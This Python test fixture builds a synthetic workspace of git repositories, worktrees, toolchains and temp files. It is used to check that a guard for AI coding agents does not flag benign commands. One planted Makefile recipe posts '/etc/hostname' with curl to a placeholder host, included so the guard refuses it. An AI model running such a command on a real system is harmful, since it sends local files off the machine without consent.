"""Synthetic, sanitized workspace for the per-PR benign false-positive gate.

Everything lives under one temporary root. Nothing here references a real user
path, private repository, or network host. The layout deliberately mirrors the
shapes that real agent sessions run in and that a bare ``git init`` fixture
never exercises:

* a parent repository that contains an untracked nested child repository;
* a linked worktree of the parent, used as the working directory;
* a global gitconfig with ``filter.lfs.*`` in the fixture HOME;
* a project skill document, a ``[slug]`` route directory and a file whose name
  resembles a credential workflow but is ordinary source;
* a second repository with a tracked gitlink plus a filter attribute, the one
  git shape that must keep requiring review;
* repositories below HOME in a parent directory that is not itself a
  repository (``~/Code/org/app-portal`` and ``~/Code/org/service-api``), each
  with ``.github`` metadata, the layout agents use when they search a child
  repository by absolute path or inspect a sibling with ``git -C``;
* a linked worktree of ``app-portal`` beside the ``org`` directory on a feature branch whose
  ``origin`` is a hosted remote, and plan notes under a HOME dot directory: the shape of a session
  started in a non-repository parent directory that works in an external worktree;
* an installed, gitignored ``node_modules`` in the working directory with the
  project's locked CLI packages, so a runner such as ``npx`` resolves to a
  content-hashed local binary instead of a registry fetch;
* connectors that need setup: a ``lanectl`` CLI in ``~/.local/bin`` with a ``~/.lanectl``
  state directory, and a Codex MCP config with a stdio and a remote server;
* the rest of a working project's toolchain in that same directory: the type
  checker, linter, formatter and task runner npm links into ``node_modules``,
  a ``.venv`` holding the console scripts ``uv sync`` installs, and the
  ``Makefile``, ``go.mod`` and ``Cargo.toml`` entry points. A real checkout is
  rarely all of these at once, but each is a command shape agents run dozens of
  times an hour, and none of them is interesting enough to review;
* every ``${HOME}``, ``${PRIVATE_TMP}`` and ``${WORKTREE}`` path a benign case
  names, derived from the cases by ``tests.benign_fp_gate_paths`` so a mined case
  reads a path that exists. Credential-looking names are never created.
"""

from __future__ import annotations

import json
import os
import secrets
import shutil
import tempfile
from dataclasses import dataclass
from pathlib import Path

import pytest

from ci.gauntlet.edge_clone_fixtures import write_edge_clone
from ci.gauntlet.fixtures import BENCH_CHECKOUT, BENCH_FILES
from ci.gauntlet.realism_fixtures import REVIEW_NOTES, SESSION_SOURCE
from ci.gauntlet.source_output_fixtures import SOURCES as TOKEN_SOURCES
from tests import codex_containment_route
from tests.benign_fp_gate_configs import write_parent_design_tokens, write_parent_documents
from tests.benign_fp_gate_cursor_project import cursor_project_path, write_cursor_projects
from tests.benign_fp_gate_developer_checkout import head_commit, write_developer_checkout
from tests.benign_fp_gate_feature_app import build_feature_app, feature_app_path
from tests.benign_fp_gate_git import _git, _session_worktree, _signed_checkout, _stopped_rebase
from tests.benign_fp_gate_hooked_clone import hooked_cwds, write_hooked_clone
from tests.benign_fp_gate_home_tree import write_home_tree
from tests.benign_fp_gate_linked_sources import build_linked_sources, linked_sources_path
from tests.benign_fp_gate_long_lived_clone import write_long_lived_clones
from tests.benign_fp_gate_org_repos import write_ignore_rule_repos, write_org_repos
from tests.benign_fp_gate_paths import materialise
from tests.benign_fp_gate_projects import (
    _INSTALLED_PACKAGES,
    _NODE_PACKAGES,
    COMMITTED_SOURCE,
    MAINTENANCE_AUTH_SOURCE,
    _application_database,
    _build_toolchain,
    _bun_lockfile,
    _node_package,
    _node_toolchain,
    _python_toolchain,
    _vendored_toolchain,
    _write,
)
from tests.benign_fp_gate_stale_lockfile import stale_lockfile_app_path


@dataclass(frozen=True)
class BenignFixture:
    root: Path
    home: Path
    parent: Path
    worktree: Path
    nested: Path
    gitlink_repo: Path
    guard_home: Path
    private_tmp: Path
    tmp_worktree: Path
    org: Path
    tmp_org: Path
    scratch: Path
    stage: Path
    # The same worktree named through a linked ancestor, as a macOS host spells
    # any `/tmp` checkout: `/tmp` resolves to `/private/tmp`.
    linked_worktree: Path
    # A linked worktree in the per-user temporary directory ``$TMPDIR`` names:
    # below ``/private/var/folders`` on macOS, ``/tmp`` elsewhere.
    user_tmp_worktree: Path

    def cleanup(self) -> None:
        """Remove the directories this fixture created outside its own root."""
        shutil.rmtree(self.private_tmp, ignore_errors=True)
        shutil.rmtree(self.contained_requests, ignore_errors=True)
        shutil.rmtree(self.tmp_worktree.parent, ignore_errors=True)
        shutil.rmtree(self.user_tmp_worktree.parent, ignore_errors=True)
        shutil.rmtree(self.tmp_org.parent, ignore_errors=True)
        shutil.rmtree(self.scratch, ignore_errors=True)
        shutil.rmtree(self.stage, ignore_errors=True)
        self.scratch_copy.unlink(missing_ok=True)
        self.scratch_patch.unlink(missing_ok=True)

    @property
    def scratch_patch(self) -> Path:
        """A patch kept straight in /tmp, as agents keep one to check before applying."""
        return Path(f"{self.scratch}-fix.patch")

    @property
    def scratch_copy(self) -> Path:
        """A saved file straight in /tmp, next to the scratch leaf, that a chain may inspect."""
        return Path(f"{self.scratch}-report-main.ts")

    @property
    def contained_requests(self) -> Path:
        """Where routed contained runs write their request files."""
        return self.root / "contained-requests"

    def tokens(self) -> dict[str, str]:
        return {
            "${HOME}": str(self.home),
            "${PARENT}": str(self.parent),
            "${WORKTREE}": str(self.worktree),
            "${NESTED}": str(self.nested),
            "${GITLINK_REPO}": str(self.gitlink_repo),
            "${PRIVATE_TMP}": str(self.private_tmp),
            "${ORG}": str(self.org),
            "${ORG_WT}": str(self.org.parent / "app-portal-fix"),
            "${ORG_CLONE}": str(self.org.parent / "app-portal-clone"),
            "${PORTAL_WEB_HEAD}": head_commit(self.org),
            "${TMP_ORG}": str(self.tmp_org),
            "${USER_TMP_WORKTREE}": str(self.user_tmp_worktree),
            # A linked worktree of the home sibling checkout in the same directory, and
            # the same path as `$TMPDIR` spells it on macOS, through the `/var` root link.
            "${USER_TMP_SIBLING}": str(self.user_tmp_worktree.parent / "sibling"),
            "${USER_TMP_SIBLING_LINK}": str(_root_link_spelling(self.user_tmp_worktree.parent / "sibling")),
            "${TMP_ORG_WT}": str(self.tmp_org.parent / "app-followup"),
            "${TMP_REMOTE}": str(self.tmp_org.parent / "remote" / "app.git"),
            # The live Gauntlet's fixture root and its fresh scratch leaf directly in /tmp.
            "${GAUNTLET_ROOT}": str(self.tmp_org.parent),
            "${SCRATCH}": str(self.scratch),
            "${FEATURE_APP}": str(feature_app_path(self.home)),
            # Private directory directly in /tmp holding the files a case stages before its commands.
            "${STAGE}": str(self.stage),
            # Left unresolved on purpose: the link is what the case is about.
            "${LINKED_WORKTREE}": str(self.linked_worktree),
            # Cursor's working-file directory for the session workspace.
            "${CURSOR_PROJECT}": str(cursor_project_path(self.home, self.worktree)),
        }

    def cwd(self, name: str) -> Path:
        return {
            "worktree": self.worktree,
            "worktree_app": self.worktree / "app",
            "parent": self.parent,
            "nested": self.nested,
            "tmp_worktree": self.tmp_worktree,
            "user_tmp_worktree": self.user_tmp_worktree,
            "gitlink_repo": self.gitlink_repo,
            "org": self.org,
            "edge_clone": self.home / "edge-clone",
            "home_project": self.home / "project",
            "home_sibling": self.home / "other-project",
            "org_app": self.org / "app-portal",
            "org_wt": self.org.parent / "app-portal-fix",
            "org_clone": self.org.parent / "app-portal-clone",
            **hooked_cwds(self.org),
            "tmp_org": self.tmp_org,
            "org_rebase": self.org.parent / "app-portal-rebase",
            "org_rebase_exec": self.org.parent / "app-portal-rebase-exec",
            "signed_app": self.home / "Code" / "signed" / "app-signed",
            # A checkout whose `.gitignore` re-includes a hidden template, as most application repositories do.
            "ignore_negation": self.home / "Code" / "ignore-rules" / "billing-api",
            "feature_app": feature_app_path(self.home),
            "pnpm_monorepo": self.home / "Code" / "acme-platform",
            # A package inside a workspace whose shared type-check base sits at
            # the checkout root, one directory above the run.
            "workspace_package": self.home / "Code" / "atlas-tools" / "packages" / "app",
            # The same workspace's checkout root, where an agent starts before
            # it steps into the package it wants to check.
            "workspace_monorepo": self.home / "Code" / "atlas-tools",
            # The package in that workspace whose base turns on `incremental`,
            # so the same type check writes a build-info file.
            "workspace_incremental_package": self.home / "Code" / "atlas-tools" / "packages" / "tool",
            "stale_lockfile_app": stale_lockfile_app_path(self.home),
            "linked_worktree": self.linked_worktree,
            "linked_sources": linked_sources_path(self.home),
        }[name]


def _system_tmp() -> str:
    """Use /tmp itself where it exists, the place real agents create scratch directories."""
    return "/tmp" if Path("/tmp").is_dir() else tempfile.gettempdir()


def _root_link_spelling(path: Path) -> Path:
    """`path` written through the macOS `/var` root link, as `$TMPDIR` names it; unchanged elsewhere."""
    private_var = Path("/private/var")
    return Path("/var") / path.relative_to(private_var) if path.is_relative_to(private_var) else path


def build_fixture(root: Path) -> BenignFixture:
    root = root.resolve()
    home = root / "home"
    parent = root / "projects" / "parent-repo"
    nested = parent / "tools" / "nested-repo"
    worktree = root / "projects" / "parent-repo-feature"
    gitlink_repo = root / "projects" / "gitlink-repo"
    guard_home = root / "guard-home"
    for directory in (home, guard_home):
        directory.mkdir(parents=True)
    write_home_tree(home)

    parent.mkdir(parents=True)
    _git(parent, "init", "--quiet", "--initial-branch=main", home=home)
    write_parent_documents(parent)
    _write(parent / "src" / "one.ts", "export const one = 1;\n")
    # The one committed file long enough for a range-limited read of its history.
    _write(parent / "src" / "report-window.ts", COMMITTED_SOURCE)
    _write(parent / "src" / "password-reset-email.tsx", "export const Email = ({ password }) => <Field password={password} />;\n")
    _write(parent / "src" / "maintenance-auth.ts", MAINTENANCE_AUTH_SOURCE)
    _write(parent / "app" / "items" / "[slug]" / "page.tsx", "export default function Page() { return null; }\n")
    _write(parent / "app" / "(group)" / "blog" / "[slug]" / "page.tsx", "export default function Post() {}\n")
    # Larger than the 32 KiB command bound, as many READMEs are. Cursor sends
    # the whole file body with each read of it.
    _write(parent / "docs" / "large-guide.md", "# Guide\n" + "Plain guide paragraph text.\n" * 1600)
    # A committed handbook page named for what it documents. Listing `docs`
    # prints the name, so a pattern that prints the same names must too.
    _write(
        parent / "docs" / "credential-rotation-runbook.md",
        "# Rotating credentials\n\nOpen the provider console and issue a new value.\n",
    )
    _write(parent / ".agents" / "skills" / "x" / "SKILL.md", "---\nname: x\n---\nSynthetic skill body.\n")
    _write(parent / "integrations" / "app" / ".claude-plugin" / "plugin.json", '{"author": "Example"}\n')
    # Git treats a link as a file: `node_modules/` alone leaves the `dashboard/node_modules` link unignored.
    _write(parent / ".gitignore", "node_modules/\ndashboard/node_modules\n")
    _git(parent, "add", "-A", home=home)
    _git(parent, "commit", "--quiet", "-m", "fixture base", home=home)
    # Untracked on purpose: the credential-name screen these documents
    # exercise is only reached for a file the walk cannot prove by its
    # checkout.
    write_parent_design_tokens(parent)
    _git(parent, "worktree", "add", "--quiet", "-b", "feature", str(worktree), home=home)
    # An existing branch no worktree has checked out, for `git worktree add <path> <branch>`.
    _git(parent, "branch", "feat/other-branch", home=home)
    _node_toolchain(worktree, tools=True)
    _bun_lockfile(worktree, _INSTALLED_PACKAGES)
    _python_toolchain(worktree)
    _build_toolchain(worktree)
    _vendored_toolchain(worktree)
    _write(worktree / "test_calc.py", "assert 1 + 1 == 2\nprint('ok')\n")
    _write(worktree / "scripts" / "rebuild.sh", "#!/bin/sh\necho rebuilt\n")
    # Reply drafted for a PR review conversation, posted with `gh pr comment --body-file`.
    _write(worktree / ".tmp" / "body.md", "Fixed in the latest push; the parser now rejects empty input.\n")
    # The application database a session opens with `sqlite3` to read its tables.
    _application_database(worktree / ".tmp" / "app.db")
    # Worktree package borrowing the canonical checkout's installed node_modules through a symlink.
    _node_toolchain(parent / "dashboard")
    _write(worktree / "dashboard" / "package.json", (parent / "dashboard" / "package.json").read_text())
    # pnpm's workspace root: `pnpm -w run build` runs the root package's script
    # from anywhere in the checkout. Only `packages` is set, so the install
    # checks still read the file as inert.
    _write(worktree / "pnpm-workspace.yaml", "packages:\n  - dashboard\n")
    (worktree / "dashboard" / "node_modules").symlink_to(parent / "dashboard" / "node_modules")
    # The live Gauntlet's placeholder docs and field-copy source, read by its shell cases.
    _write(worktree / "docs" / "review-notes.md", REVIEW_NOTES)
    _write(worktree / "dashboard" / "src" / "session.js", SESSION_SOURCE)
    # The live Gauntlet's token-handling sources (redirect route, link worker, HMAC helper).
    for relative, text in TOKEN_SOURCES.items():
        _write(worktree / relative, text)
    # The test beside that source: a project file whose name reads like a
    # credential, named by the runner a session runs over it.
    _write(
        worktree / "portal" / "src" / "lib" / "attribution-token.test.ts",
        "import { expect, test } from 'vitest';\n\ntest('signs', () => expect(1).toBe(1));\n",
    )
    # The live Gauntlet's sign-in folder and the held data files beside it, in a repository of their own.
    build_feature_app(home, os.environ.get("PATH", ""))
    # The live Gauntlet's clone with local configuration files beside its code.
    write_edge_clone(home, {"PATH": os.environ.get("PATH", ""), "HOME": str(home), "GIT_CONFIG_NOSYSTEM": "1"})
    # Fresh worktree package whose dependencies are installed only in the canonical checkout.
    _write(parent / "web" / "node_modules" / "left-pad" / "package.json", "{}\n")
    _write(worktree / "web" / "package.json", '{"private": true}\n')

    # The project tree named through a link, the spelling a host hands the hook
    # whenever an ancestor is a link. Kept beside the real tree so the case does
    # not depend on how the host spells its own temp directory.
    linked_projects = root / "linked-projects"
    linked_projects.symlink_to(root / "projects")
    linked_worktree = linked_projects / "parent-repo-feature"

    # Untracked child repository nested inside the parent working tree.
    nested.mkdir(parents=True)
    _git(nested, "init", "--quiet", "--initial-branch=main", home=home)
    _write(nested / "tool.py", "print('tool')\n")
    _git(nested, "add", "-A", home=home)
    _git(nested, "commit", "--quiet", "-m", "nested base", home=home)

    # Untracked linked worktree inside the parent tree, another shape agents leave behind.
    _git(parent, "worktree", "add", "--quiet", "-b", "inner", str(parent / ".worktrees" / "inner"), home=home)

    # Private user-owned temp dir (mode 0700, as mktemp -d creates) with one existing file.
    private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
    _write(private_tmp / "notes.txt", "first draft\n")
    _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
    # A probe file an earlier step wrote here: the cases that copy it into the
    # checkout are about where it came from, not about whether it exists.
    _write(private_tmp / "p8.ts", "export const probe = 1;\n")
    # A script an agent wrote for itself in a fresh scratch directory: Guard has never decided on it.
    _write(private_tmp / "agent-script" / "index.js", "console.log('scratch');\n")
    # A recipe outside the workspace, so running it is refused for what it is
    # rather than for naming a file that is not there.
    _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
    # A PostgreSQL run directory: agents glob its hidden socket lock files by name.
    _write(private_tmp / "pg-run" / ".s.PGSQL.5432.lock", "4242\n")
    # A running local Postgres leaves its socket and lock beside it, which is
    # what a session lists when it checks whether the server is up.
    _write(private_tmp / ".s.PGSQL.5432.lock", "4242\n")
    # Files a session preserved before resetting its checkout, copied back by glob.
    _write(private_tmp / "preserved" / "src" / "discovery" / "catalog.ts", "export const catalog = [];\n")
    _write(private_tmp / "preserved" / "src" / "discovery" / "rank.ts", "export const rank = 1;\n")
    _write(private_tmp / "preserved" / "tests" / "discovery.test.ts", "export const covered = true;\n")
    # A repository any session could `git init` in the shared temp area: no sibling root for its scripts.
    _write(private_tmp / "scratch-repo" / "run.py", "print('run')\n")
    _git(private_tmp / "scratch-repo", "init", "--quiet", "--initial-branch=main", home=home)
    # Workspace as a linked worktree under the system temp area whose registered siblings are outside cwd.
    tmp_worktree = Path(tempfile.mkdtemp(prefix="wt.", dir=_system_tmp())).resolve() / "workspace"
    _git(parent, "worktree", "add", "--quiet", "-b", "tmp-feature", str(tmp_worktree), home=home)
    user_tmp_worktree = Path(tempfile.mkdtemp(prefix="wt.", dir=tempfile.gettempdir())).resolve() / "workspace"
    _git(parent, "worktree", "add", "--quiet", "-b", "user-tmp-feature", str(user_tmp_worktree), home=home)
    # A hidden tool directory inside it, which never takes a dependency link.
    (user_tmp_worktree / ".cache").mkdir()
    # A linked worktree of the home sibling checkout beside it, freshly added: a package in a subfolder that
    # builds with its own script and nothing installed, a crate, and a plugin manifest in a hidden folder.
    user_tmp_sibling = user_tmp_worktree.parent / "sibling"
    _git(home / "other-project", "worktree", "add", "--quiet", "-b", "user-tmp-sibling", str(user_tmp_sibling), home=home)
    scripts = {"build": "node scripts/build.mjs", "test": "node --test"}
    _write(user_tmp_sibling / "dashboard" / "package.json", json.dumps({"private": True, "scripts": scripts}) + "\n")
    _write(user_tmp_sibling / "dashboard" / "scripts" / "build.mjs", "console.log('built');\n")
    _write(user_tmp_sibling / "plugins" / "app" / ".codex-plugin" / "plugin.json", '{"author": "Example"}\n')
    _write(user_tmp_sibling / "rust" / "Cargo.toml", '[package]\nname = "sibling"\nversion = "0.1.0"\nedition = "2021"\n')

    # Tracked gitlink plus a filter attribute: must remain reviewable.
    gitlink_repo.mkdir(parents=True)
    _git(gitlink_repo, "init", "--quiet", "--initial-branch=main", home=home)
    _write(gitlink_repo / ".gitattributes", "sub filter=lfs\n*.bin filter=lfs\n")
    _write(gitlink_repo / "readme.txt", "gitlink fixture\n")
    _git(gitlink_repo, "add", "-A", home=home)
    _git(
        gitlink_repo,
        "update-index",
        "--add",
        "--cacheinfo",
        f"160000,{_git(nested, 'rev-parse', 'HEAD', home=home)},sub",
        home=home,
    )
    _git(gitlink_repo, "commit", "--quiet", "-m", "gitlink base", home=home)

    # Repositories below HOME whose shared parent is not a repository.
    org = home / "Code" / "org"
    write_org_repos(org, home)
    _session_worktree(org, home)
    write_developer_checkout(org, home, _git, _write)
    write_hooked_clone(org, home, _git)
    # Years-old clones gaining sibling worktrees, one with a post-checkout hook.
    write_long_lived_clones(home, _git)
    _signed_checkout(home)
    _stopped_rebase(org, home, "app-portal-rebase")
    # A rebase started with an `exec` step keeps that program in its saved todo list.
    _stopped_rebase(org, home, "app-portal-rebase-exec", "-x", "true")
    write_ignore_rule_repos(home)
    build_linked_sources(home, _git)
    # A non-repository parent under /tmp whose repository has a linked worktree beside the parent.
    tmp_org = Path(tempfile.mkdtemp(prefix="org.", dir=_system_tmp())).resolve() / "org"
    (tmp_org / "app").mkdir(parents=True)
    _git(tmp_org / "app", "init", "--quiet", "--initial-branch=main", home=home)
    _write(tmp_org / "app" / "README.md", "# app\n")
    _write(home / ".nvm" / "versions" / "node" / "v25.2.1" / "lib" / "node_modules" / "npm" / "package.json", "{}\n")
    _write(home / ".bun" / "install" / "global" / "node_modules" / "vite" / "package.json", "{}\n")
    # A tool directory that keeps a credential store of its own, so a walk of
    # it would print that store's layout rather than an inventory.
    _write(home / ".toolbox" / "bin" / "tool.sh", "#!/bin/sh\necho tool\n")
    _write(home / ".toolbox" / ".aws" / "config", "[default]\nregion = us-east-1\n")
    # Installed dependency and toolchain source under hidden home directories.
    pipx_site = home / ".local" / "pipx" / "venvs" / "tool" / "lib" / "python3.12" / "site-packages"
    _write(pipx_site / "pkg" / "mod.py", "_COLD_START = 0.5\n")
    _write(home / ".local" / "lib" / "python3.12" / "site-packages" / "pkg" / "mod.py", "X = 1\n")
    _write(home / ".cargo" / "registry" / "src" / "index" / "serde-1.0.0" / "src" / "lib.rs", "pub fn serde() {}\n")
    rustlib_core = home / ".rustup" / "toolchains" / "stable" / "lib" / "rustlib" / "src" / "rust" / "library" / "core"
    _write(rustlib_core / "src" / "lib.rs", "//! core\n")
    _write(tmp_org / "app" / "package.json", '{"name": "app", "version": "1.0.0"}\n')
    _write(tmp_org / "app" / "src" / "index.ts", "export const railStage = 1;\n")
    _write(tmp_org / "app" / "tests" / "index.test.ts", "import { railStage } from '../src';\n")
    _write(tmp_org / "app" / "scripts" / "report.py", "print('report')\n")
    _write(tmp_org / "app" / ".gitignore", "node_modules/\n")
    _git(tmp_org / "app", "add", "-A", home=home)
    _git(tmp_org / "app", "commit", "--quiet", "-m", "app base", home=home)
    # Installed, gitignored runner under the scratch checkout: agents list its
    # `.bin` shim from a sibling, and a recursive grep over this checkout has
    # to walk the package store the way a real one does.
    _node_package(tmp_org / "app", "vitest", _NODE_PACKAGES["vitest"])
    followup = str(tmp_org.parent / "app-followup")
    _git(tmp_org / "app", "worktree", "add", "--quiet", "-b", "followup", followup, home=home)
    # This worktree ran its own install, unlike ``app-portal-fix`` above, so
    # sharing the main checkout's package store here meets a directory already
    # standing at that name and the link lands inside it.
    _node_package(Path(followup), "vitest", _NODE_PACKAGES["vitest"])
    remote = tmp_org.parent / "remote" / "app.git"
    _git(tmp_org.parent, "clone", "--quiet", "--bare", str(tmp_org / "app"), str(remote), home=home)
    _git(tmp_org / "app", "remote", "add", "origin", str(remote), home=home)
    # A benchmark checkout outside HOME whose test vectors are named for secrets and tokens.
    bench = tmp_org.parent / BENCH_CHECKOUT
    for relative, text in BENCH_FILES.items():
        _write(bench / relative, text)
    _git(bench, "init", "--quiet", "--initial-branch=main", home=home)
    _git(bench, "add", "-A", home=home)
    _git(bench, "commit", "--quiet", "-m", "bench base", home=home)
    # A leaf directly in /tmp that does not exist yet, as a throwaway checkout destination.
    scratch = Path(_system_tmp()) / f"hg-fp-scratch-{os.getpid()}-{secrets.token_hex(4)}"
    # Paths the mined cases name under the scrubbed project stand-ins, derived from the cases themselves.
    materialise({"HOME": home, "PRIVATE_TMP": private_tmp, "WORKTREE": worktree})
    write_cursor_projects(home, worktree)
    # Sources the mined cases search by pattern. ``materialise`` builds the
    # directory a glob names but not a file inside it, and a pattern that
    # matches nothing makes the case measure an empty expansion instead of the
    # search it was mined from.
    _write(worktree / "signup-funnel" / "workers" / "queue.ts", "export const drain = () => read_workspace_record();\n")
    _write(
        worktree / "signup-funnel" / "lib" / "records" / "workspace.ts",
        "export function read_workspace_record() {\n  return null;\n}\n",
    )
    _write(
        worktree / "build.rs",
        "// Build script for the fixture crate.\nenum WorkspaceRecord {\n    Draft,\n}\n\nfn main() {}\n",
    )
    _write(worktree / "compose.yaml", "services:\n  app:\n    image: scratch\n")
    # Source files a session staged in /tmp before copying them into a checkout.
    stage = Path(tempfile.mkdtemp(prefix="hg-fp-stage-", dir=_system_tmp())).resolve()
    _write(stage / "x.ts", "export const summary = 2;\n")
    _write(stage / "a.ts", "export const copied = 3;\n")
    fixture = BenignFixture(
        root,
        home,
        parent,
        worktree,
        nested,
        gitlink_repo,
        guard_home,
        private_tmp,
        tmp_worktree,
        org,
        tmp_org,
        scratch,
        stage,
        linked_worktree,
        user_tmp_worktree,
    )
    _write(fixture.scratch_copy, "export const reportWindow = 'report-window-marker';\n")
    _write(
        fixture.scratch_patch,
        "diff --git a/src/report.ts b/src/report.ts\n--- a/src/report.ts\n+++ b/src/report.ts\n"
        "@@ -1 +1 @@\n-export const reportWindow = 'report-window-marker';\n+export const reportWindow = '24h';\n",
    )
    return fixture


def route_codex(result: dict[str, object], payload: dict[str, object], fixture: BenignFixture) -> dict[str, object]:
    """Run the real Codex bridge rewrite for a Codex release that applies ``updatedInput``.

    Codex before 0.131 keeps the denial with an update hint, so the gates model
    0.131 or later and say nothing about older releases. The contained request
    file goes to the fixture's own directory, which ``cleanup`` removes.
    """
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(codex_containment_route, "launching_codex_executable", lambda: Path("/usr/local/bin/codex"))
        patch.setattr(codex_containment_route, "codex_applies_updated_input", lambda *_args, **_kwargs: True)
        fixture.contained_requests.mkdir(exist_ok=True)
        patch.setattr(tempfile, "tempdir", str(fixture.contained_requests))
        return codex_containment_route.route_codex_containment(
            dict(result),
            hook_input=json.dumps(payload),
            guard_home=fixture.guard_home,
            home_dir=fixture.home,
        )
